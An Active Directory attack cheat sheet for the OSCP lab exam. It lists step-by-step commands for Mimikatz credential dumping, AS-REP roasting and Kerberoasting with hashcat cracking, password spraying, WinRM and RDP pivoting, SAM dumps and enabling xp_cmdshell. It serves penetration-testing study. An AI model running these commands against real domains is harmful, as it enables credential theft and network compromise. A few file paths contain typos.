# 🛡️ OSCP Active Directory Lab Guide

## 1. Escalate on MS01 (Always Dual-Homed)
- Check privileges:
```powershell
whoami /priv
```
- If `SeImpersonatePrivilege` is there, use one of [these](https://x7331.gitbook.io/boxes/tl-dr/active-directory/privileges/seimpersonateprivilege) to escalate to Local Admin
## 2. Pillaging
- Dump credentials with Mimikatz:
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```
- Check PowerShell history:
```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
## 3. Enumerate the Domain (From MS01)
- Enumerate domain users and build a wordlist
```bash
$ nxc smb 192.168.X.X -u <user> -p <pass> --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" {print $5}' > domain_users
```
- Enumerate SMB shares
```bash
nxc smb 192.168.X.X -u <user> -p <pass> --shares
```
- Check for [AS-REP Roasting](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/asreproasting):
```bash
impacket-GetNPUsers oscp.exam/ -dc-ip 10.10.X.X -no-pass -usersfile domain_users
hashcat -m 18200 asreproast_users /usr/share/wordlists/rockyou -r /usr/share/hashcast/rules/best64.rule --force
```
- Check for [Kerberoasting](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/kerberoasting):
```bash
impacket-GetUserSPNs -request -dc-ip 10.10.X.X oscp.exam/<user>
hashcat -m 13100 kerberoast_users /usr/share/wordlist/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
- Password spray the domain to enumerate valid accounts and remote access:
```bash
nxc smb domain_ips -u domain_users -p passwords --continue-on-success | grep +
nxc winrm domain_ips -u domain_users -p passwords --continue-on-success | grep +
nxc rdp domain_ips -u domain_users -p passwords --continue-on-success | grep +
```
## 3. Pivot to MS02
- Use sprayed creds to access via WinRM or RDP:
```bash
evil-winrm -u <user> -p <pass> -i <MS02>
xfreerdp /u:<user> /p:<pass> /v:<MS02> /smart-sizing
```
## 4. Enumerate MS02
- Check for `C:\windows.old` folder → [dump SAM and SYSTEM locally](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/local-sam-dump):
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
- Look for custom binaries → download and run `strings` to extract creds, check for [binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking
- Read [PowerShell history](https://x7331.gitbook.io/boxes/tl-dr/infra/windows#files):
```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Enumerate the path
(Get-PSReadlineOption).HistorySavePath
# List its contents
cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
## 5. Domain Privilege Escalation
- Crack Kerberoast/AS-REP hashes (e.g. with hashcat or john)
- Use cracked SQL creds to connect with mssqlclient.py:
```bash
mssqlclient.py <domain>/<user>@<host> -windows-auth
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
- Spray all discovered creds again to escalate further
